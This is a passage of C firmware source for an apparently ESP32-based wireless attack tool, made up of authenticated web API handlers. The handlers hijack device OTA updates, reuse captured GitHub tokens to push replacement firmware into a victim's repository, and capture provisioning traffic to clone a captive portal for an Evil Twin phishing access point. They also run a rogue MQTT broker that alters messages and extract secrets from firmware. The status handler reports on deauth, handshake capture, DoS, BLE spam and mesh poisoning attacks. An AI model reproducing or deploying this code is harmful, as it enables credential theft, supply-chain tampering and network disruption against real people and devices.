        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *index_json = cJSON_GetObjectItem(root, "url_index");
    int url_index = cJSON_IsNumber(index_json) ? index_json->valueint : 0;
    cJSON *ssid_json = cJSON_GetObjectItem(root, "wifi_ssid");
    cJSON *pass_json = cJSON_GetObjectItem(root, "wifi_password");
    cJSON *ssl_json = cJSON_GetObjectItem(root, "verify_ssl");
    const char *ssid = cJSON_IsString(ssid_json) ? ssid_json->valuestring : NULL;
    const char *pass = cJSON_IsString(pass_json) ? pass_json->valuestring : NULL;
    bool verify_ssl = cJSON_IsBool(ssl_json) ? ssl_json->valueint : false;

    bool ok = ota_fetch_download_by_index_ex(url_index, ssid, pass, verify_ssl);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "started", ok);
    return send_json_response(req, resp);
}

static esp_err_t ota_download_result_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const char *json = ota_fetch_get_download_result_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json ? json : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t ota_dns_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const char *json = ota_poll_sniff_get_dns_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json ? json : "[]");
    return ESP_OK;
}

static esp_err_t ota_http_entries_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const char *json = ota_poll_sniff_get_http_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json ? json : "[]");
    return ESP_OK;
}

/* ── GitHub Repo Operations ──────────────────────────────────── */

static esp_err_t ota_github_parse_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[512];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *url_json = cJSON_GetObjectItem(root, "url");
    if (!cJSON_IsString(url_json) || url_json->valuestring == NULL) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing url");
        return ESP_FAIL;
    }

    ota_github_repo_t repo;
    memset(&repo, 0, sizeof(repo));
    bool ok = ota_github_parse_url(url_json->valuestring, &repo);

    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    if (ok) {
        cJSON_AddStringToObject(resp, "owner", repo.owner);
        cJSON_AddStringToObject(resp, "repo", repo.repo);
        cJSON_AddStringToObject(resp, "path", repo.path);
        cJSON_AddStringToObject(resp, "branch", repo.branch);
        if (repo.token[0]) cJSON_AddStringToObject(resp, "token", repo.token);
        cJSON_AddBoolToObject(resp, "token_valid", repo.token_valid);
        cJSON_AddBoolToObject(resp, "parsed", repo.parsed);
    }
    return send_json_response(req, resp);
}

static esp_err_t ota_github_access_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[768];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    ota_github_repo_t repo;
    memset(&repo, 0, sizeof(repo));

    cJSON *owner_json  = cJSON_GetObjectItem(root, "owner");
    cJSON *repo_json   = cJSON_GetObjectItem(root, "repo");
    cJSON *token_json  = cJSON_GetObjectItem(root, "token");
    cJSON *branch_json = cJSON_GetObjectItem(root, "branch");

    if (cJSON_IsString(owner_json))  strncpy(repo.owner, owner_json->valuestring, sizeof(repo.owner) - 1);
    if (cJSON_IsString(repo_json))   strncpy(repo.repo, repo_json->valuestring, sizeof(repo.repo) - 1);
    if (cJSON_IsString(token_json))  strncpy(repo.token, token_json->valuestring, sizeof(repo.token) - 1);
    if (cJSON_IsString(branch_json)) strncpy(repo.branch, branch_json->valuestring, sizeof(repo.branch) - 1);

    if (!repo.owner[0] || !repo.token[0]) {
        const char *repo_json_str = ota_github_get_repo_json();
        if (repo_json_str) {
            cJSON *cur = cJSON_Parse(repo_json_str);
            if (cur) {
                cJSON *o = cJSON_GetObjectItem(cur, "owner");
                cJSON *r = cJSON_GetObjectItem(cur, "repo");
                cJSON *b = cJSON_GetObjectItem(cur, "branch");
                if (!repo.owner[0] && cJSON_IsString(o)) strncpy(repo.owner, o->valuestring, sizeof(repo.owner) - 1);
                if (!repo.repo[0] && cJSON_IsString(r)) strncpy(repo.repo, r->valuestring, sizeof(repo.repo) - 1);
                if (!repo.branch[0] && cJSON_IsString(b)) strncpy(repo.branch, b->valuestring, sizeof(repo.branch) - 1);
                /* token may be omitted from JSON for safety; access uses module current_repo */
                cJSON_Delete(cur);
            }
        }
        /* Prefer module-held current_repo when request body is empty */
        ota_github_repo_t tmp;
        memset(&tmp, 0, sizeof(tmp));
        /* If still incomplete, access will fail cleanly */
        repo.parsed = (repo.owner[0] && repo.repo[0]);
    } else {
        repo.parsed = true;
    }

    bool ok = ota_github_access_repo(&repo);

    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    cJSON_AddBoolToObject(resp, "token_valid", repo.token_valid);
    if (repo.token[0]) cJSON_AddStringToObject(resp, "token", repo.token);
    return send_json_response(req, resp);
}

static esp_err_t ota_github_list_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    /* Read path from query string: ?path=firmware/ */
    char path_buf[128] = {0};
    if (httpd_req_get_url_query_str(req, path_buf, sizeof(path_buf)) == ESP_OK) {
        char decoded[128] = {0};
        if (get_form_value(path_buf, "path", decoded, sizeof(decoded))) {
            /* decoded now has the path value */
        }
    }

    /* Use the current GitHub repo context from ota_github module */
    ota_github_repo_t repo;
    memset(&repo, 0, sizeof(repo));

    /* Try to get repo info from the OTA attack module's current state */
    const char *repo_json_str = ota_github_get_repo_json();
    if (repo_json_str && strlen(repo_json_str) > 2) {
        cJSON *repo_obj = cJSON_Parse(repo_json_str);
        if (repo_obj) {
            cJSON *o = cJSON_GetObjectItem(repo_obj, "owner");
            cJSON *r = cJSON_GetObjectItem(repo_obj, "repo");
            cJSON *t = cJSON_GetObjectItem(repo_obj, "token");
            cJSON *b = cJSON_GetObjectItem(repo_obj, "branch");
            if (cJSON_IsString(o)) strncpy(repo.owner, o->valuestring, sizeof(repo.owner) - 1);
            if (cJSON_IsString(r)) strncpy(repo.repo, r->valuestring, sizeof(repo.repo) - 1);
            if (cJSON_IsString(t)) strncpy(repo.token, t->valuestring, sizeof(repo.token) - 1);
            if (cJSON_IsString(b)) strncpy(repo.branch, b->valuestring, sizeof(repo.branch) - 1);
            cJSON_Delete(repo_obj);
        }
    }

    const char *list_path = path_buf[0] ? path_buf : "";
    const char *result = ota_github_list_files(&repo, list_path);

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, result ? result : "{\"files\":[],\"error\":\"no repo context\"}");
    return ESP_OK;
}

static esp_err_t ota_github_file_sha_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[256];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;

    cJSON *file_path_json = cJSON_GetObjectItem(root, "file_path");
    if (!cJSON_IsString(file_path_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing file_path");
        return ESP_FAIL;
    }

    /* Get current repo context */
    ota_github_repo_t repo;
    memset(&repo, 0, sizeof(repo));
    const char *repo_json_str = ota_github_get_repo_json();
    if (repo_json_str && strlen(repo_json_str) > 2) {
        cJSON *repo_obj = cJSON_Parse(repo_json_str);
        if (repo_obj) {
            cJSON *o = cJSON_GetObjectItem(repo_obj, "owner");
            cJSON *r = cJSON_GetObjectItem(repo_obj, "repo");
            cJSON *t = cJSON_GetObjectItem(repo_obj, "token");
            if (cJSON_IsString(o)) strncpy(repo.owner, o->valuestring, sizeof(repo.owner) - 1);
            if (cJSON_IsString(r)) strncpy(repo.repo, r->valuestring, sizeof(repo.repo) - 1);
            if (cJSON_IsString(t)) strncpy(repo.token, t->valuestring, sizeof(repo.token) - 1);
            cJSON_Delete(repo_obj);
        }
    }

    bool ok = ota_github_get_file_sha(&repo, file_path_json->valuestring);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    if (ok && repo.file_sha[0]) {
        cJSON_AddStringToObject(resp, "sha", repo.file_sha);
    }
    return send_json_response(req, resp);
}

static esp_err_t ota_github_upload_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[512];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;

    cJSON *fw_path_json   = cJSON_GetObjectItem(root, "firmware_path");
    cJSON *commit_msg_json = cJSON_GetObjectItem(root, "commit_msg");
    cJSON *fw_data_json   = cJSON_GetObjectItem(root, "firmware_hex");
    cJSON *fw_size_json   = cJSON_GetObjectItem(root, "firmware_size");

    /* Get repo context */
    ota_github_repo_t repo;
    memset(&repo, 0, sizeof(repo));
    const char *repo_json_str = ota_github_get_repo_json();
    if (repo_json_str && strlen(repo_json_str) > 2) {
        cJSON *repo_obj = cJSON_Parse(repo_json_str);
        if (repo_obj) {
            cJSON *o = cJSON_GetObjectItem(repo_obj, "owner");
            cJSON *r = cJSON_GetObjectItem(repo_obj, "repo");
            cJSON *t = cJSON_GetObjectItem(repo_obj, "token");
            cJSON *b = cJSON_GetObjectItem(repo_obj, "branch");
            cJSON *s = cJSON_GetObjectItem(repo_obj, "file_sha");
            if (cJSON_IsString(o)) strncpy(repo.owner, o->valuestring, sizeof(repo.owner) - 1);
            if (cJSON_IsString(r)) strncpy(repo.repo, r->valuestring, sizeof(repo.repo) - 1);
            if (cJSON_IsString(t)) strncpy(repo.token, t->valuestring, sizeof(repo.token) - 1);
            if (cJSON_IsString(b)) strncpy(repo.branch, b->valuestring, sizeof(repo.branch) - 1);
            if (cJSON_IsString(s)) strncpy(repo.file_sha, s->valuestring, sizeof(repo.file_sha) - 1);
            cJSON_Delete(repo_obj);
        }
    }

    const char *target_path = cJSON_IsString(fw_path_json) ? fw_path_json->valuestring : "firmware.bin";
    const char *commit_msg  = cJSON_IsString(commit_msg_json) ? commit_msg_json->valuestring : "Update firmware";

    /* Parse hex firmware data if provided, otherwise use downloaded firmware from OTA module */
    bool ok = false;
    if (cJSON_IsString(fw_data_json) && cJSON_IsNumber(fw_size_json)) {
        const char *hex = fw_data_json->valuestring;
        size_t hex_len = strlen(hex);
        uint32_t fw_size = (uint32_t)fw_size_json->valueint;

        if (hex_len > 0 && fw_size > 0 && hex_len / 2 <= OTA_MAX_FIRMWARE_SIZE) {
            uint8_t *fw_data = heap_psram_malloc(fw_size);
            if (fw_data) {
                for (uint32_t i = 0; i < fw_size && i * 2 + 1 < hex_len; i++) {
                    unsigned int byte;
                    if (sscanf(hex + i * 2, "%02x", &byte) == 1) {
                        fw_data[i] = (uint8_t)byte;
                    }
                }
                ok = ota_github_upload_firmware(&repo, fw_data, fw_size, target_path, commit_msg);
                heap_psram_free(fw_data);
            }
        }
    }

    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    return send_json_response(req, resp);
}

static esp_err_t ota_github_repo_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_github_get_repo_json());
    return ESP_OK;
}

static esp_err_t ota_github_result_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_github_get_result_json());
    return ESP_OK;
}

/* ── Provision Sniffer Handlers ─────────────────────────────────── */

static esp_err_t ota_prov_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    cJSON *status = ota_provision_get_status_json();
    if (status) cJSON_AddStringToObject(status, "mode", "PROVISION_CAPTURE");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    return send_json_response(req, status);
}

static esp_err_t ota_prov_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    esp_err_t err = ota_provision_stop();
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR,
                            "Provision capture stop failed");
        return ESP_FAIL;
    }
    return send_success_response(req);
}

static esp_err_t ota_prov_preview_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_sendstr(req, ota_provision_get_preview_json());
    return ESP_OK;
}

static esp_err_t ota_prov_summary_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_provision_get_summary_json());
    return ESP_OK;
}

static esp_err_t ota_prov_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ota_provision_clear();
    return send_success_response(req);
}

static esp_err_t ota_prov_pcap_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    const uint8_t *pcap = NULL;
    size_t pcap_size = 0;
    esp_err_t err = ota_provision_get_pcap(&pcap, &pcap_size);
    if (err == ESP_ERR_INVALID_STATE) {
        httpd_resp_set_status(req, "409 Conflict");
        httpd_resp_set_type(req, "text/plain");
        httpd_resp_sendstr(req, "Stop capture before downloading PCAP");
        return ESP_FAIL;
    }
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "No PCAP capture available");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/vnd.tcpdump.pcap");
    httpd_resp_set_hdr(req, "Content-Disposition",
                       "attachment; filename=\"provision-http.pcap\"");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    const size_t chunk_size = 4096;
    for (size_t offset = 0; offset < pcap_size; offset += chunk_size) {
        size_t length = pcap_size - offset;
        if (length > chunk_size) length = chunk_size;
        if (httpd_resp_send_chunk(req, (const char *)pcap + offset, length) != ESP_OK) {
            httpd_resp_send_chunk(req, NULL, 0);
            return ESP_FAIL;
        }
    }
    return httpd_resp_send_chunk(req, NULL, 0);
}

static esp_err_t ota_prov_portal_build_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    esp_err_t err = ota_provision_build_portal();
    if (err == ESP_ERR_NOT_FOUND) {
        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND,
                            "No provision metadata to build portal from");
        return ESP_FAIL;
    }
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR,
                            "Portal build failed");
        return ESP_FAIL;
    }
    return send_json_response(req, ota_provision_get_portal_meta_json());
}

static esp_err_t ota_prov_portal_meta_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    return send_json_response(req, ota_provision_get_portal_meta_json());
}

static esp_err_t ota_prov_portal_html_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    if (!ota_provision_has_portal()) {
        esp_err_t err = ota_provision_build_portal();
        if (err != ESP_OK) {
            httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "No portal available");
            return ESP_FAIL;
        }
    }
    const char *html = ota_provision_get_portal_html();
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_sendstr(req, html);
    return ESP_OK;
}

static esp_err_t ota_prov_apply_portal_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    if (!ota_provision_has_portal()) {
        esp_err_t err = ota_provision_build_portal();
        if (err != ESP_OK) {
            httpd_resp_send_err(req, HTTPD_404_NOT_FOUND,
                                "No provision metadata to build portal from");
            return ESP_FAIL;
        }
    }
    esp_err_t err = attack_eviltwin_set_portal_html(
        ota_provision_get_portal_html(),
        ota_provision_get_portal_wrong_html());
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR,
                            "Failed to apply portal to Evil Twin");
        return ESP_FAIL;
    }

    cJSON *root = ota_provision_get_portal_meta_json();
    if (root) {
        cJSON_AddBoolToObject(root, "applied_to_eviltwin", true);
        cJSON_AddBoolToObject(root, "eviltwin_running",
                              attack_eviltwin_is_running());
    }
    return send_json_response(req, root);
}

/* ── Rogue Broker Handlers ──────────────────────────────────────── */

static esp_err_t ota_mitm_messages_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_rogue_broker_get_mitm_json());
    return ESP_OK;
}

static esp_err_t ota_rogue_broker_summary_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_rogue_broker_get_summary_json());
    return ESP_OK;
}

static esp_err_t ota_mitm_modify_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[768];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *topic_json   = cJSON_GetObjectItem(root, "topic");
    cJSON *payload_json = cJSON_GetObjectItem(root, "payload");
    if (!cJSON_IsString(topic_json) || !cJSON_IsString(payload_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing topic or payload");
        return ESP_FAIL;
    }

    bool ok = ota_rogue_broker_set_modify_rule(topic_json->valuestring, payload_json->valuestring);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    return send_json_response(req, resp);
}

static esp_err_t ota_mitm_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ota_rogue_broker_clear_mitm();
    return send_success_response(req);
}

/* ── Firmware Analysis Handlers ─────────────────────────────────── */

static esp_err_t ota_fw_analyze_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    int found = ota_fw_analyze_run();
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", found > 0);
    cJSON_AddNumberToObject(resp, "secrets_found", found);
    return send_json_response(req, resp);
}

static esp_err_t ota_fw_secrets_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_fw_analyze_get_secrets_json());
    return ESP_OK;
}

static esp_err_t ota_fw_summary_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_fw_analyze_get_summary_json());
    return ESP_OK;
}

static esp_err_t ota_fw_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ota_fw_analyze_clear_secrets();
    return send_success_response(req);
}

static esp_err_t ota_chain_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[1024];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    ota_github_config_t cfg = {0};
    cJSON *ssid_json = cJSON_GetObjectItem(root, "wifi_ssid");
    cJSON *pass_json = cJSON_GetObjectItem(root, "wifi_password");
    cJSON *broker_json = cJSON_GetObjectItem(root, "mqtt_broker");
    cJSON *port_json = cJSON_GetObjectItem(root, "mqtt_port");
    cJSON *wait_json = cJSON_GetObjectItem(root, "wait_for_device_sec");
    cJSON *fw_path_json = cJSON_GetObjectItem(root, "gh_firmware_path");
    cJSON *gh_branch_json = cJSON_GetObjectItem(root, "gh_branch");
    cJSON *gh_commit_json = cJSON_GetObjectItem(root, "gh_commit_msg");
    cJSON *gh_idx_json = cJSON_GetObjectItem(root, "gh_captured_url_index");

    if (cJSON_IsString(ssid_json)) strncpy(cfg.wifi_ssid, ssid_json->valuestring, sizeof(cfg.wifi_ssid) - 1);
    if (cJSON_IsString(pass_json)) strncpy(cfg.wifi_password, pass_json->valuestring, sizeof(cfg.wifi_password) - 1);
    if (cJSON_IsString(broker_json)) strncpy(cfg.mqtt_broker, broker_json->valuestring, sizeof(cfg.mqtt_broker) - 1);
    cfg.mqtt_port = cJSON_IsNumber(port_json) ? (uint16_t)port_json->valueint : 1883;
    strncpy(cfg.subscribe_topic, "#", sizeof(cfg.subscribe_topic) - 1);
    cfg.timeout_sec = cJSON_IsNumber(wait_json) ? (uint32_t)wait_json->valueint : 300;
    if (cJSON_IsString(fw_path_json)) strncpy(cfg.gh_firmware_path, fw_path_json->valuestring, sizeof(cfg.gh_firmware_path) - 1);
    else strncpy(cfg.gh_firmware_path, "firmware.bin", sizeof(cfg.gh_firmware_path) - 1);
    if (cJSON_IsString(gh_branch_json)) strncpy(cfg.gh_branch, gh_branch_json->valuestring, sizeof(cfg.gh_branch) - 1);
    else strncpy(cfg.gh_branch, "main", sizeof(cfg.gh_branch) - 1);
    if (cJSON_IsString(gh_commit_json)) strncpy(cfg.gh_commit_msg, gh_commit_json->valuestring, sizeof(cfg.gh_commit_msg) - 1);
    else strncpy(cfg.gh_commit_msg, "Update firmware", sizeof(cfg.gh_commit_msg) - 1);
    cfg.gh_captured_url_index = cJSON_IsNumber(gh_idx_json) ? gh_idx_json->valueint : -1;

    esp_err_t err = ota_github_start(&cfg);
    cJSON_Delete(root);
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Chain start failed");
        return ESP_FAIL;
    }
    return send_success_response(req);
}

/* ================================================================== */
/*  STATUS / STOP HANDLERS                                             */
/* ================================================================== */

static esp_err_t stop_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_timer_active = false;
    stop_deauth_attack();
    attack_bt_spam_stop();
    return send_success_response(req);
}

static esp_err_t status_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    cJSON *response = cJSON_CreateObject();
    if (response == NULL) {
        return send_json_response(req, response);
    }
    cJSON_AddBoolToObject(response, "attacking", is_attack_active());
    cJSON_AddBoolToObject(response, "ble_running", attack_bt_spam_is_running());
    cJSON_AddBoolToObject(response, "ble_deauth_running", ble_deauth_is_running());
    cJSON_AddBoolToObject(response, "ble_connect_running", ble_connect_flood_is_running());
    cJSON_AddBoolToObject(response, "ble_l2cap_running", ble_l2cap_flood_is_running());
    cJSON_AddBoolToObject(response, "ble_spoof_running", ble_spoof_is_running());
    cJSON_AddBoolToObject(response, "ble_passkey_running", ble_passkey_is_running());
    cJSON_AddBoolToObject(response, "ble_takeover_running", ble_takeover_is_running());
    cJSON_AddBoolToObject(response, "ota_running", ota_any_active());
    cJSON_AddBoolToObject(response, "eviltwin_running", attack_eviltwin_is_running());
    cJSON_AddBoolToObject(response, "probe_running", attack_probe_is_running());
    cJSON_AddBoolToObject(response, "pmkid_running", attack_pmkid_is_running());
    cJSON_AddBoolToObject(response, "handshake_running", attack_handshake_is_running());
    cJSON_AddBoolToObject(response, "dos_running", attack_dos_is_running());
    cJSON_AddBoolToObject(response, "beacon_running", attack_beacon_spam_is_running());
    cJSON_AddBoolToObject(response, "deauth_detect_running", deauth_detector_is_running());
    cJSON_AddBoolToObject(response, "karma_running", attack_karma_is_running());
    cJSON_AddBoolToObject(response, "csa_running", attack_csa_is_running());
    cJSON_AddBoolToObject(response, "pmf_running", attack_pmf_is_running());
    cJSON_AddBoolToObject(response, "wps_running", attack_wps_is_running());
    cJSON_AddBoolToObject(response, "eap_audit_running", attack_eap_audit_is_running());
    cJSON_AddBoolToObject(response, "mesh_inject_running", mesh_packet_inject_is_active());
    cJSON_AddBoolToObject(response, "mesh_mitm_running", mesh_mitm_is_active());
    cJSON_AddBoolToObject(response, "mesh_dos_running", mesh_dos_is_active());
    cJSON_AddBoolToObject(response, "mesh_eavesdrop_running", mesh_eavesdrop_is_active());
    cJSON_AddBoolToObject(response, "mesh_replay_running", mesh_replay_is_active());
    cJSON_AddBoolToObject(response, "mesh_wormhole_running", mesh_wormhole_is_active());
    cJSON_AddBoolToObject(response, "mesh_l2_deauth_running", mesh_l2_deauth_is_active());
    cJSON_AddBoolToObject(response, "mesh_route_poison_running", mesh_route_poison_is_active());
    cJSON_AddBoolToObject(response, "espnow_running", espnow_attack_is_active());
    if (attack_dos_is_running()) {
        cJSON_AddStringToObject(response, "dos", "DoS attack active");
        cJSON_AddStringToObject(response, "dos_method", attack_dos_get_method_str());
        cJSON_AddNumberToObject(response, "dos_packets", attack_dos_get_packet_count());
    }
    if (attack_beacon_spam_is_running()) {
        cJSON_AddStringToObject(response, "beacon", "Beacon spam active");
        cJSON_AddStringToObject(response, "beacon_mode", attack_beacon_spam_get_mode_str());
        cJSON_AddNumberToObject(response, "beacon_aps", attack_beacon_spam_get_ap_count());
        cJSON_AddNumberToObject(response, "beacon_packets", attack_beacon_spam_get_packet_count());
    }
    if (attack_bt_spam_is_running()) {
        cJSON_AddStringToObject(response, "bluetooth", "BLE spam active");
    }
    if (ble_deauth_is_running()) {
        cJSON_AddStringToObject(response, "ble_deauth", "BLE deauth active");
    }
    if (ble_spoof_is_running()) {
        const char *mode_str = (ble_spoof_get_mode() == BLE_SPOOF_MODE_CLONE) 
                                ? "BLE clone active" : "BLE spoof active";
